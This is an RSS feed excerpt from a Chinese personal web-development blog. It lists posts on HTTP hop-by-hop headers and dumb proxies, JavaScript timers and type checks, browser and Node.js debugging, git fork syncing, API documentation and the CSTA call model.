      <link>https://wdd.js.org/posts/2018/tcp-high-recv-q-or-send-q-reasons/</link>
      <pubDate>Thu, 08 Feb 2018 21:58:31 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/tcp-high-recv-q-or-send-q-reasons/</guid>
      <description>1. 问题现象 使用netstat -ntp命令时发现，Recv-Q 1692012 异常偏高（正常情况下，该值应该是0），导致应用占用过多的内存。
tcp 1692012 0 172.17.72.4:48444 10.254.149.149:58080 ESTABLISHED 27/node 问题原因：代理的转发时，没有删除逐跳首部
2. 什么是Hop-by-hop 逐跳首部？ http首部可以分为两种
端到端首部 End-to-end: 端到端首部代理在转发时必须携带的 逐跳首部 Hop-by-hop: 逐跳首部只对单次转发有效，代理在转发时，必须删除这些首部 逐跳首部有以下几个, 这些首部在代理进行转发前必须删除
Connetion Keep-Alive Proxy-Authenticate Proxy-Authortization Trailer TE Transfer-Encodeing Upgrade 3. 什么是哑代理？ 很多老的或简单的代理都是盲中继(blind relay),它们只是将字节从一个连接转发到另一个连接中去,不对Connection首部进行特殊的处理。
(1)在图4-15a中 Web客户端向代理发送了一条报文,其中包含了Connection:Keep-Alive首部,如果可能的话请求建立一条keep-alive连接。客户端等待响应,以确定对方是否认可它对keep-alive信道的请求。
(2) 哑代理收到了这条HTTP请求,但它并不理解 Connection首部(只是将其作为一个扩展首部对待)。代理不知道keep-alive是什么意思,因此只是沿着转发链路将报文一字不漏地发送给服务器(图4-15b)。但Connection首部是个逐跳首部,只适用于单条传输链路,不应该沿着传输链路向下传输。接下来,就要发生一些很糟糕的事情了。
(3) 在图4-15b中,经过中继的HTTP请求抵达了Web服务器。当Web服务器收到经过代理转发的Connection: Keep-Alive首部时,会误以为代理(对服务器来说,这个代理看起来就和所有其他客户端一样)希望进行keep-alive对话!对Web服务器来说这没什么问题——它同意进行keep-alive对话,并在图4-15c中回送了一个Connection: Keep-Alive响应首部。所以,此时W eb服务器认为它在与代理进行keep-alive对话,会遵循keep-alive的规则。但代理却对keep-alive一无所知。不妙。
(4) 在图4-15d中,哑代理将Web服务器的响应报文回送给客户端,并将来自Web服务器的Connection: Keep-Alive首部一起传送过去。客户端看到这个首部,就会认为代理同意进行keep-alive对话。所以,此时客户端和服务器都认为它们在进行keep-alive对话,但与它们进行对话的代理却对keep-alive一无所知。
(5) 由于代理对keep-alive一无所知,所以会将收到的所有数据都回送给客户端,然后等待源端服务器关闭连接。但源端服务器会认为代理已经显式地请求它将连接保持在打开状态了,所以不会去关闭连接。这样,代理就会挂在那里等待连接的关闭。
(6) 客户端在图4-15d中收到了回送的响应报文时,会立即转向下一条请求,在keep-alive连接上向代理发送另一条请求(参见图4-15e)。而代理并不认为同一条连接上会有其他请求到来,请求被忽略,浏览器就在这里转圈,不会有任何进展了。
(7) 这种错误的通信方式会使浏览器一直处于挂起状态,直到客户端或服务器将连接超时,并将其关闭为止。 &amp;ndash;《HTTP权威指南》
这是HTTP权威指南中，关于HTTP哑代理的描述。这里这里说了哑代理会造成的一个问题。
这种错误的通信方式会使浏览器一直处于挂起状态,直到客户端或服务器将连接超时,并将其关闭为止。 实际上，我认为哑代理还是造成以下问题的原因
TCP链接高Recv-Q tcp链接不断开，导致服务器内存过高，内存泄露 节点iowait高 在我们自己的代理的代码中，我有发现，在代理进行转发时，只删除了headers.host, 并没有删除headers.Connection等逐跳首部的字段
delete req.headers.host var option = { url: url, headers: req.</description>
    </item>
    
    <item>
      <title>定时器学习：利用定时器分解耗时任务案例</title>
      <link>https://wdd.js.org/posts/2018/settimeout-to-splice-big-work/</link>
      <pubDate>Thu, 08 Feb 2018 14:09:54 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/settimeout-to-splice-big-work/</guid>
      <description>对于执行时间过长的脚本，有的浏览器会弹出警告，说页面无响应。有的浏览器会直接终止脚本。总而言之，浏览器不希望某一个代码块长时间处于运行状态，因为js是单线程的。一个代码块长时间运行，将会导致其他任何任务都必须等待。从用户体验上来说，很有可能发生页面渲染卡顿或者点击事件无响应的状态。
如果一段脚本的运行时间超过5秒，有些浏览器（比如Firefox和Opera）将弹出一个对话框警告用户该脚本“无法响应”。而其他浏览器，比如iPhone上的浏览器，将默认终止运行时间超过5秒钟的脚本。&amp;ndash;《JavaScript忍者秘籍》
JavaScript忍者秘籍里有个很好的比喻：页面上发生的各种事情就好像一群人在讨论事情，如果有个人一直在说个不停，其他人肯定不乐意。我们希望有个裁判，定时的切换其他人来说话。
Js利用定时器来分解任务，关键点有两个。
按什么维度去分解任务
任务的现场保存与现场恢复
1. 例子 要求：动态创建一个表格，一共10000行，每行10个单元格
1.1. 一次性创建 &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;#34;utf-8&amp;#34;&amp;gt; &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;table&amp;gt; &amp;lt;tbody&amp;gt;&amp;lt;/tbody&amp;gt; &amp;lt;/table&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt; var tbody = document.getElementsByTagName(&amp;#39;tbody&amp;#39;)[0]; var allLines = 10000; // 每次渲染的行数 console.time(&amp;#39;wd&amp;#39;); for(var i=0; i&amp;lt;allLines; i++){ var tr = document.createElement(&amp;#39;tr&amp;#39;); for(var j=0; j&amp;lt;10; j++){ var td = document.createElement(&amp;#39;td&amp;#39;); td.appendChild(document.createTextNode(i+&amp;#39;,&amp;#39;+j)); tr.appendChild(td); } tbody.appendChild(tr); } console.timeEnd(&amp;#39;wd&amp;#39;); &amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; 总共耗时180ms, 浏览器已经给出警告！[Violation] &#39;setTimeout&#39; handler took 53ms。
1.2. 分批次动态创建 &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;#34;utf-8&amp;#34;&amp;gt; &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;table&amp;gt; &amp;lt;tbody&amp;gt;&amp;lt;/tbody&amp;gt; &amp;lt;/table&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt; var tbody = document.</description>
    </item>
    
    <item>
      <title>关于JavaScropt函数式编程，我多么希望能早点看到这本书</title>
      <link>https://wdd.js.org/posts/2018/js-functional-programming/</link>
      <pubDate>Thu, 08 Feb 2018 14:06:22 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/js-functional-programming/</guid>
      <description>我父亲以前跟我说过，有些事物在你得到之前是无足轻重的，得到之后就不可或缺了。微波炉是这样，智能手机是这样，互联网也是这样——老人们在没有互联网的时候过得也很充实。对我来说，函数的柯里化（curry）也是这样。
然后我继续看了这本书的中文版。有些醍醐灌顶的感觉。 随之在github搜了一下。 我想，即使付费，我也愿意看。
中文版地址：https://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details github原文地址：https://github.com/MostlyAdequate/mostly-adequate-guide
1. 后记 其实我是想学点函数柯里化的东西，然后用谷歌搜索了一下。第一个结果就是这本书。非常感谢谷歌搜索，如果我用百度，可能就没有缘分遇到这本书了。</description>
    </item>
    
    <item>
      <title>终于找到你！如何将前端console.log的日志保存成文件?</title>
      <link>https://wdd.js.org/posts/2018/save-console-log-as-file/</link>
      <pubDate>Thu, 08 Feb 2018 13:56:40 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/save-console-log-as-file/</guid>
      <description>本篇文章来自一个需求，前端websocket会收到各种消息，但是调试的时候，我希望把websoekt推送过来的消息都保存到一个文件里，如果出问题的时候，我可以把这些消息的日志文件提交给后端开发区分析错误。但是在浏览器里，js一般是不能写文件的。鼠标另存为的方法也是不太好，因为会保存所有的console.log的输出。于是，终于找到这个debugout.js。
debugout.js的原理是将所有日志序列化后，保存到一个变量里。当然这个变量不会无限大，因为默认的最大日志限制是2500行，这个是可配置的。另外，debugout.js也支持在localStorage里存储日志的。
1. debugout.js 一般来说，可以使用打开console面板，然后右键save，是可以将console.log输出的信息另存为log文件的。但是这就把所有的日志都包含进来了，如何只保存我想要的日志呢？
（调试输出）从您的日志中生成可以搜索，时间戳，下载等的文本文件。 参见下面的一些例子。
Debugout的log（）接受任何类型的对象，包括函数。 Debugout不是一个猴子补丁，而是一个单独的记录类，你使用而不是控制台。
调试的一些亮点：
在运行时或任何时间获取整个日志或尾部 搜索并切片日志 更好地了解可选时间戳的使用模式 在一个地方切换实时日志记录（console.log） 可选地将输出存储在window.localStorage中，并在每个会话中持续添加到同一个日志 可选地，将日志上限为X个最新行以限制内存消耗 下图是使用downloadLog方法下载的日志文件。
官方提供的demo示例，欢迎试玩。http://inorganik.github.io/debugout.js/
2. 使用 在脚本顶部的全局命名空间中创建一个新的调试对象，并使用debugout的日志方法替换所有控制台日志方法：
var bugout = new debugout(); // instead of console.log(&amp;#39;some object or string&amp;#39;) bugout.log(&amp;#39;some object or string&amp;#39;); 3. API log() -像console.log(), 但是会自动存储 getLog() - 返回所有日志 tail(numLines) - 返回尾部执行行日志，默认100行 search(string) - 搜索日志 getSlice(start, numLines) - 日志切割 downloadLog() - 下载日志 clear() - 清空日志 determineType() - 一个更细粒度的typeof为您提供方便 4. 可选配置 ··· // log in real time (forwards to console.</description>
    </item>
    
    <item>
      <title>如何浏览器里调试iframe里层的代码？</title>
      <link>https://wdd.js.org/posts/2018/debug-code-in-iframe/</link>
      <pubDate>Thu, 08 Feb 2018 13:53:48 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/debug-code-in-iframe/</guid>
      <description>之前一直非常痛苦，在iframe外层根本获取不了里面的信息，后来使用了postMessage用传递消息来实现，但是用起来还是非常不方便。
其实浏览器本身是可以选择不同的iframe的执行环境的。例如有个变量是在iframe里面定义的，你只需要切换到这个iframe的执行环境，你就可以随意操作这个环境的任何变量了。
这个小技巧，对于调试非常有用，但是我直到今天才发现。
1. Chrome 这个小箭头可以让你选择不同的iframe的执行环境，可以切换到你的iframe环境里。
2. IE 如图所示是ie11的dev tool点击下来箭头，也可以选择不同的iframe执行环境。
3. 其他浏览器 其他浏览器可以自行摸索一下。。。（G_H）</description>
    </item>
    
    <item>
      <title>Audio 如果你愿意一层一层剥开我的心</title>
      <link>https://wdd.js.org/posts/2018/audio-heart-detail/</link>
      <pubDate>Thu, 08 Feb 2018 09:44:01 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/audio-heart-detail/</guid>
      <description>我觉得DOM就好像是元素周期表里的元素，JS就好像是实验器材，通过各种化学反应，产生各种魔术。
1. Audio 通过打开谷歌浏览器的dev tools -&amp;gt; Settings -&amp;gt; Elements -&amp;gt; Show user agent shadow DOM, 你可以看到其实Audio标签也是由常用的 input标签和div等标签合成的。
2. 基本用法 1 &amp;lt;audio src=&amp;#34;http://65.ierge.cn/12/186/372266.mp3&amp;#34;&amp;gt; Your browser does not support the audio element. &amp;lt;/audio&amp;gt; &amp;lt;br&amp;gt; 2 &amp;lt;audio src=&amp;#34;http://65.ierge.cn/12/186/372266.mp3&amp;#34; controls=&amp;#34;controls&amp;#34;&amp;gt; Your browser does not support the audio element. &amp;lt;/audio&amp;gt; &amp;lt;br&amp;gt; // controlsList属性目前只支持 chrome 58+ 3 &amp;lt;audio src=&amp;#34;http://65.ierge.cn/12/186/372266.mp3&amp;#34; controls=&amp;#34;controls&amp;#34; controlsList=&amp;#34;nodownload&amp;#34;&amp;gt; Your browser does not support the audio element. &amp;lt;/audio&amp;gt; &amp;lt;br&amp;gt; 4 &amp;lt;audio controls=&amp;#34;controls&amp;#34;&amp;gt; &amp;lt;source src=&amp;#34;http://65.</description>
    </item>
    
    <item>
      <title>可能被遗漏的https与http的知识点</title>
      <link>https://wdd.js.org/posts/2018/you-dont-know-https-and-http/</link>
      <pubDate>Thu, 08 Feb 2018 09:10:59 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/you-dont-know-https-and-http/</guid>
      <description>1. HTTPS域向HTTP域发送请求会被浏览器直接拒绝，HTTP向HTTPS则不会 例如在github pages页面，这是一个https页面，如果在这个页面向http发送请求，那么会直接被浏览器拒绝，并在控制台输出下面的报错信息。
jquery-1.11.3.min.js:5 Mixed Content: The page at &amp;#39;https://wangduanduan.github.io/ddddddd/&amp;#39; was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint &amp;#39;http://cccccc/log/conf?token=welljoint&amp;#39;. This request has been blocked; the content must be served over HTTPS. 如果你在做第三方集成的系统，如果他们是在浏览器中直接调用你提供的接口，那么最好你使用https协议，这样无论对方是https还是http都可以访问。（相信我，这个很重要，我曾经经历过上线后遇到这个问题，然后连夜申请证书，把http升级到https的痛苦经历）
2. HTTPS的默认端口是443，而不是443 如果443端口已经被其他服务占用了，那么使用其他任何没有被占用的端口都可以用作HTTPS服务，只不过在请求的时候需要加上端口号罢了。
3. 如何快速隐藏一个DOM元素 选中一个元素，然后按h,这时候就会在选中的DOM元素上加上__web-inspector-hide-shortcut__类，这个类会让元素隐藏。谷歌和火狐上都可以，IE上没有试过行不行。</description>
    </item>
    
    <item>
      <title>直接在Chrome DevTools调试Node.js</title>
      <link>https://wdd.js.org/posts/2018/debug-nodejs-in-chrome-devtool/</link>
      <pubDate>Wed, 07 Feb 2018 14:15:43 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/debug-nodejs-in-chrome-devtool/</guid>
      <description>英文好的，直接看原文
https://blog.hospodarets.com/nodejs-debugging-in-chrome-devtools
1. 要求 Node.js 6.3+ Chrome 55+ 2. 操作步骤 1 打开连接 chrome://flags/#enable-devtools-experiments 2 开启开发者工具实验性功能 3 重启浏览器 4 打开 DevTools Setting -&amp;gt; Experiments tab 5 按6次shift后，隐藏的功能会出现，勾选&amp;quot;Node debugging&amp;quot; 3. 运行程序 必须要有 --inspect
&amp;gt; node --inspect www Debugger listening on port 9229. Warning: This is an experimental feature and could change at any time. To start debugging, open the following URL in Chrome: chrome-devtools://devtools/remote/serve_file/@60cd6e859b9f557d2312f5bf532f6aec5f284980/inspector.html?experiments=true&amp;amp;v8only=true&amp;amp;ws=localhost:9229/78a884f4-8c2e-459e-93f7-e1cbe87cf5cf 将这个地址粘贴到谷歌浏览器：chrome-devtools://devtools/remote/serve_file/@60cd6e859b9f557d2312f5bf532f6aec5f284980/inspector.html?experiments=true&amp;amp;v8only=true&amp;amp;ws=localhost:9229/78a884f4-8c2e-459e-93f7-e1cbe87cf5cf
程序后端输出的日志也回输出到谷歌浏览器的console里面，同时也可以在Sources里进行断点调试了。 </description>
    </item>
    
    <item>
      <title>【译】13简单的优秀编码规则（从我15年的经验）</title>
      <link>https://wdd.js.org/posts/2018/few-simple-rules-for-good-coding-my-15-years-experience/</link>
      <pubDate>Wed, 07 Feb 2018 14:03:12 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/few-simple-rules-for-good-coding-my-15-years-experience/</guid>
      <description>原文地址：https://hackernoon.com/few-simple-rules-for-good-coding-my-15-years-experience-96cb29d4acd9#.ddzpjb80c
嗨，我的工作作为一个程序员超过15年，并使用许多不同的语言，范例，框架和其他狗屎。我想和大家分享我写好代码的规则。
1. 优化VS可读性 去他妈的优化 始终编​​写易于阅读且对开发人员可理解的代码。因为在硬可读代码上花费的时间和资源将远远高于从优化中获得的。 如果你需要进行优化，那么使它像DI的独立模块，具有100％的测试覆盖率，并且不会被触及至少一年。
2. 架构第一 我看到很多人说“我们需要快速做事，我们没有时间做架构”。其中约99％的人因为这样的想法而遇到了大问题。 编写代码而不考虑其架构是没有用的，就像没有实现它们的计划一样，梦想你的愿望。 在编写代码的第一行之前，你应该明白它将要做什么，它将如何使用，模块，服务如何相互工作，它将有什么结构，如何进行测试和调试，以及如何更新。
3. 测试覆盖率 测试是好事，但他们并不总是负担得起，对项目有意义。
当你需要测试：
当你编写模块时，微服务将不会被触及至少一个月。 当你编写开源代码。 当你编写涉及金融渠道的核心代码或代码。 当您有代码更新的同时更新测试的资源。 当你不需要测试时：
当你是一个创业。 当你有小团队和代码更改是快速。 当你编写的脚本，可以简单地通过他们的输出手动测试。 记住，带有严格测试的代码可能比没有测试的代码更有害。
4. 保持简单，极度简单 不要编写复杂的代码。更多更简单，那么更少的错误它可能有和更少的时间来调试它们。代码应该做的只是它需要没有非常多的抽象和其他OOP shit（尤其是涉及java开发人员）+ 20％的东西可能需要在将来以简单的方式更新它。
5. 注释 出现注释说明你的代码不够好。好的代码应该是可以理解的，没有一行注释。但是如何为新开发人员节省时间？ - 编写简单的内联文档描述什么和如何方法工作。这将节省很多时间来理解，甚至更多 - 它将给人们更多的机会来提出更好的实施这种方法。并且它将是全球代码文档的良好开端。
6. 硬耦合VS较小耦合 始终尝试使用微服务架构。单片软件可以比微服务软件运行得更快，但只能在一个服务器的上下文中运行。 微服务使您可以不仅在许多服务器上，而且有时甚至在一台机器上（我的意思是过程分发）高效地分发您的软件。
7. 代码审查 代码审查可以是好的，也以是坏的。 您可以组织代码审查，只有当您有开发人员了解95％的代码，谁可以监控所有更新，而不浪费很多时间。在其他情况下，这将是只是耗时，每个人都会讨厌这个。
在这部分有很多问题，所以更深入地描述这一点。
许多人认为代码审查是一个很好的方式教新手，或者工作在不同部分的代码的队友。但是代码审查的主要目标是保持代码质量，而不是教学。让我们想象你的团队制作代码用于控制核反应堆或太空火箭发动机的冷却系统。你在非常硬的逻辑中犯了巨大的错误，然后你给这个代码审查新的家伙。你怎么认为会发生意外的风险？ - 我的练习率超过70％。
良好的团队是每个人都有自己的角色，负责确切的工作。如果有人想要理解另一段代码，那么他去一个负责任去问他。你不可能知道一切，更好的优秀的理解小块代码而不是理解所有。
8. 重构没啥用 在我的职业生涯中，我听到很多次“不要担心，我们以后会重构它”。在未来，这会导致大的技术债务或从头开始删除所有的代码和写作。
所以，不要得到一个债务，除非你有钱从头开发你的软件几次。
9. 当你累了或在一个坏的心情不要写代码。 当开发人员厌倦时，他们正在制造2到5倍或者更多的bug。所以工作更多是非常糟糕的做法。这就是为什么越来越多的国家思考6小时工作日，其中一些已经有了。精神工作不同于使用你的二头肌。
10. 不要一次写全部 - 使开发迭代 在编写代码分析和预测之前，您的客户/客户真正需要什么，然后选择您可以在短期内以高质量开发的MVF（最有价值的功能）。使用这样的迭代来部署质量更新，而不是腰部时间和资源对不合理的愿望和牺牲与质量。
11. 自动化VS手动 自动化是长期的100％成功。所以如果你有资源自动化的东西，现在应该做。你可能认为“只需要5分钟，为什么我应该自动化？但让我计算这个。例如，它是5个开发人员的日常任务。 5分钟* 5天* 21天* 12个月= 6 300分钟= 105小时= 13.</description>
    </item>
    
    <item>
      <title>JavaScript 高级技巧</title>
      <link>https://wdd.js.org/posts/2018/js-high-skills/</link>
      <pubDate>Wed, 07 Feb 2018 10:14:56 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/js-high-skills/</guid>
      <description>0.1. 安全类型检测 javascript内置类型检测并不可靠 safari某些版本（&amp;lt;4）typeof正则表达式返回为function 建议使用Object.prototype.toString.call()方法检测数据类型
function isArray(value){ return Object.prototype.toString.call(value) === &amp;#34;[object Array]&amp;#34;; } function isFunction(value){ return Object.prototype.toString.call(value) === &amp;#34;[object Function]&amp;#34;; } function isRegExp(value){ return Object.prototype.toString.call(value) === &amp;#34;[object RegExp]&amp;#34;; } function isNativeJSON(){ return window.JSON &amp;amp;&amp;amp; Object.prototype.toString.call(JSON) === &amp;#34;[object JSON]&amp;#34;; } 对于ie中一COM对象形式实现的任何函数，isFunction都返回false，因为他们并非原生的javascript函数。
在web开发中，能够区分原生与非原生的对象非常重要。只有这样才能确切知道某个对象是否有哪些功能
以上所有的正确性的前提是：Object.prototype.toString没有被修改过
0.2. 作用域安全的构造函数 function Person(name){ this.name = name; } //使用new来创建一个对象 var one = new Person(&amp;#39;wdd&amp;#39;); //直接调用构造函数 Person(); 由于this是运行时分配的，如果你使用new来操作，this指向的就是one。如果直接调用构造函数，那么this会指向全局对象window,然后你的代码就会覆盖window的原生name。如果有其他地方使用过window.name, 那么你的函数将会埋下一个深藏的bug。
==那么，如何才能创建一个作用域安全的构造函数？== 方法1
function Person(name){ if(this instanceof Person){ this.name = name; } else{ return new Person(name); } } 1.</description>
    </item>
    
    <item>
      <title>突然觉得自己好像没学过JS</title>
      <link>https://wdd.js.org/posts/2018/i-realy-dont-know-js/</link>
      <pubDate>Wed, 07 Feb 2018 10:09:42 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/i-realy-dont-know-js/</guid>
      <description>0.1. 先看题：mean的值是什么？ var scores = [10,11,12]; var total = 0; for(var score in scores){ total += score; } var mean = total/scores.length; console.log(mean); 0.2. 是11？ 恭喜你：答错了！
0.3. 是1？ 恭喜你：答错了！
0.4. 正确答案： 4 解释： for in 循环循环的值永远是key, key是一个字符串。所以total的值是：&amp;lsquo;0012&amp;rsquo;。它是一个字符串，字符串&#39;0012&amp;rsquo;/3,0012会被转换成12，然后除以3，结果是4。
0.5. 后记 这个示例是来自《编写高质量JavaScript的68个方法》的第49条：数组迭代要优先使用for循环而不是for in循环。 既然已经发布，就可能有好事者拿出去当面试题。这个题目很有可能坑一堆人。其中包括我。
这里涉及到许多js的基础知识.
for in 循环是循环对象的索引属性，key是一个字符串。 数值类型和字符串相加，会自动转换为字符串 字符串除以数值类型，会先把字符串转为数值，最终结果为数值 正确方法
var scores = [10,11,12]; var total = 0; for(var i=0, n=scores.length; i &amp;lt; n; i++){ total += scores[i]; } var mean = total/scores.</description>
    </item>
    
    <item>
      <title>发起Ajax请求当页面onunload</title>
      <link>https://wdd.js.org/posts/2018/send-ajax-when-page-unload/</link>
      <pubDate>Wed, 07 Feb 2018 09:18:54 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/send-ajax-when-page-unload/</guid>
      <description>0.1. 同步Ajax 这种需求主要用于当浏览器关闭，或者刷新时，向后端发起Ajax请求。
window.onunload = function(){ $.ajax({url:&amp;#34;http://localhost:8888/test.php?&amp;#34;, async:false}); }; 使用async：false参数使请求同步（默认是异步的）。
同步请求锁定浏览器，直到完成。 如果请求是异步的，页面只是继续卸载。 它足够快，以至于该请求甚至没有时间触发。服务端很可能收不到请求。
0.2. navigator.sendBeacon 优点：简洁、异步、非阻塞 缺点：这是实验性的技术，并非所有浏览器都支持。其中IE和safari不支持该技术。
示例：
window.addEventListener(&amp;#39;unload&amp;#39;, logData, false); function logData() { navigator.sendBeacon(&amp;#34;/log&amp;#34;, analyticsData); } 参考：http://stackoverflow.com/questions/1821625/ajax-request-with-jquery-on-page-unload 参考：https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon</description>
    </item>
    
    <item>
      <title>git合并上游仓库即同步fork后的仓库</title>
      <link>https://wdd.js.org/posts/2018/fork-sync-learn/</link>
      <pubDate>Wed, 31 Jan 2018 17:16:44 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/fork-sync-learn/</guid>
      <description>1. 前提说明 仓库A: http://gitlab.tt.cc:30000/fe/omp.git 仓库B: 仓库Bfork自仓库A, 仓库A的地址是：http://gitlab.tt.cc:30000/wangdd/omp.git 某一时刻，仓库A更新了。仓库B需要同步上游分支的更新。
2. 本地操作 // 1 查看远程分支 ➜ omp git:(master) git remote -v origin	http://gitlab.tt.cc:30000/wangdd/omp.git (fetch) origin	http://gitlab.tt.cc:30000/wangdd/omp.git (push) // 2 添加一个远程同步的上游仓库 ➜ omp git:(master) git remote add upstream http://gitlab.tt.cc:30000/fe/omp.git ➜ omp git:(master) git remote -v origin	http://gitlab.tt.cc:30000/wangdd/omp.git (fetch) origin	http://gitlab.tt.cc:30000/wangdd/omp.git (push) upstream	http://gitlab.tt.cc:30000/fe/omp.git (fetch) upstream	http://gitlab.tt.cc:30000/fe/omp.git (push) // 3 拉去上游分支到本地，并且会被存储在一个新分支upstream/master ➜ omp git:(master) git fetch upstream remote: Counting objects: 4, done. remote: Compressing objects: 100% (4/4), done.</description>
    </item>
    
    <item>
      <title>关于我</title>
      <link>https://wdd.js.org/about/</link>
      <pubDate>Wed, 31 Jan 2018 12:09:09 +0800</pubDate>
      
      <guid>https://wdd.js.org/about/</guid>
      <description>个人简介 我是端端！
精通JavaScript/Node.js，现在的兴趣是学习go语言 精通VOIP相关技术栈：SIP/opensips/Freeswitch等等 精通VIM email: 1779706607@qq.com Github: github.com/wangduanduan 语雀: yuque.com/wangdd, 将不会更新 个人博客: wdd.js.org, 最新内容将会发布在wdd.js.org 最喜欢的美剧《黄石》 博客说明 博客取名为洞香春，灵感来自孙皓晖所著《大秦帝国》。
洞香春大致在战国时代中期所在地：魏国安邑。
战国时期，社会制度发生着巨大变化，工商业日益兴旺，出现了以白圭为首的一批巨贾商人，而位于魏国安邑的洞香春酒肆就是白氏家族创办的产业中最为著名的一个。
洞香春以名士荟萃、谈论国事、交流思想而著称于当时列国</description>
    </item>
    
    <item>
      <title>如何写好接口文档？</title>
      <link>https://wdd.js.org/posts/2018/how-to-write-better-api-docs/</link>
      <pubDate>Mon, 29 Jan 2018 22:01:55 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/how-to-write-better-api-docs/</guid>
      <description>1. HTTP携带信息的方式 url headers body: 包括请求体，响应体 2. 分离通用信息 一般来说，headers里的信息都是通用的，可以提前说明，作为默认参数
3. 路径中的参数表达式 URL中参数表达式使用{}的形式，参数包裹在大括号之中{paramName}
例如：
/api/user/{userId} /api/user/{userType}?age={age}&amp;amp;gender={gender} 4. 数据模型定义 数据模型定义包括：
路径与查询字符串参数模型 请求体参数模型 响应体参数模型 数据模型的最小数据集：
名称 是否必须 说明 “最小数据集”（MDS）是指通过收集最少的数据，较好地掌握一个研究对象所具有的特点或一件事情、一份工作所处的状态，其核心是针对被观察的对象建立起一套精简实用的数据指标。最小数据集的概念起源于美国的医疗领域。最小数据集的产生源于信息交换的需要，就好比上下级质量技术监督部门之间、企业与质量技术监督部门之间、质量技术监督部门与社会公众之间都存在着信息交换的需求。
一些文档里可能会加入字段的类型，但是我认为这是没必要的。以为HTTP传输的数据往往都需要序列化，大部分数据类型都是字符串。一些特殊的类型，例如枚举类型的字符串，可以在说明里描述。
另外：数据模型非常建议使用表格来表现。
举个栗子🌰：
名称 是否必须 说明 userType 是 用户类型。commom表示普通用户，vip表示vip用户 age 否 用户年龄 gender 否 用户性别。1表示男，0表示女 5. 请求示例 // general POST http://www.testapi.com/api/user // request payload { &amp;#34;name&amp;#34;: &amp;#34;qianxun&amp;#34;, &amp;#34;age&amp;#34;: 14, &amp;#34;like&amp;#34;: [&amp;#34;music&amp;#34;, &amp;#34;reading&amp;#34;], &amp;#34;userType&amp;#34;: &amp;#34;vip&amp;#34; } // response { &amp;#34;id&amp;#34;: &amp;#34;asdkfjalsdkf&amp;#34; } 6. 异常处理 异常处理最小数据集</description>
    </item>
    
    <item>
      <title>win7 ie11 开发者工具打开后一片空白</title>
      <link>https://wdd.js.org/posts/2018/ie11-without-devtool/</link>
      <pubDate>Mon, 29 Jan 2018 21:43:12 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/ie11-without-devtool/</guid>
      <description>解决方法安装Windows7补丁：KB3008923； 下载地址： http://www.microsoft.com/en-us/download/details.aspx?id=45134 （32位） http://www.microsoft.com/zh-CN/download/details.aspx?id=45154 （64位）</description>
    </item>
    
    <item>
      <title>CSTA 呼叫模型简介</title>
      <link>https://wdd.js.org/posts/2018/csta-call-model-overview/</link>
      <pubDate>Mon, 29 Jan 2018 21:35:24 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/csta-call-model-overview/</guid>
      <description>1. 内容概要 CSTA协议与标准概述 CSTA OpenScape 语音架构概述 2. CSTA协议标准 2.1. 什么是CSTA ? CSTA：电脑支持通讯程序(Computer Supported TelecommunicationsApplications)
基本的呼叫模型在1992建立，后来随着行业发展，呼叫模型也被加强和扩展，例如新的协议等等
CSTA是一个应用层接口，用来监控呼叫，设备和网络
CSTA创建了一个通讯程序的抽象层:
CSTA并不依赖任何底层的信令协议 E.g.H.323,SIP,Analog,T1,ISDN,etc. CSTA并不要求用户必须使用某些设备 E.g.intelligentendpoints,low-function/stimulusdevices,SIPSignalingmodels-3PCC vs. Peer/Peer 适用不同的操作模式
第三方呼叫控制 一方呼叫控制 CSTA的设计目标是为了提高各种CSTA实现之间的移植性
规范化呼叫模型和行为 完成服务、事件定义 规范化标准 3. CSTA 标准的进化史 阶段1 (发布于 June ’92)
40 特性, 66 页 (服务定义) 专注于呼叫控制 阶段2 (发布于 Dec. ’94)
77 特性, 145 页 (服务定义) I/O &amp;amp; 语音单元服务, 更多呼叫控制服务 阶段3 - CSTA Phase II Features &amp;amp; versit CTI Technology
发布于 Dec. ‘98 136 特性, 650 页 (服务定义) 作为ISO 标准发布于 July 2000 发布 CSTA XML (ECMA-323) June 2004 发布 “Using CSTA with Voice Browsers” (TR/85) Dec.</description>
    </item>
    
    <item>
      <title>组织在召唤：如何免费获取一个js.org的二级域名</title>
      <link>https://wdd.js.org/posts/2018/how-to-get-jsorg-sub-domain/</link>
      <pubDate>Mon, 29 Jan 2018 18:08:03 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/how-to-get-jsorg-sub-domain/</guid>
      <description>之前我是使用wangduanduan.github.io作为我的博客地址，后来觉得麻烦，有把博客关了。最近有想去折腾折腾。 先看效果：wdd.js.org
如果你不了解js.org可以看看我的这篇文章:一个值得所有前端开发者关注的网站js.org
